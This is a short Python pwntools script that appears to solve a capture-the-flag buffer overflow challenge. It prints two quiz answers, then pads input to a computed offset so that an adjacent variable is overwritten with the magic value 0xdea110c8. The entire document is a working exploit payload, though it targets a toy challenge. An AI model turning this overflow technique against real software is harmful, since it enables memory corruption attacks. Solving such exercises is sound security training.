from pwn import *
first = "Sir Lancelot of Camelot\n"
second = "To seek the Holy Grail.\n"
offset = 0x3b - 0x10
magic = 0xdea110c8
third = cyclic(offset)
third = fit({offset:magic})
print first+second+third
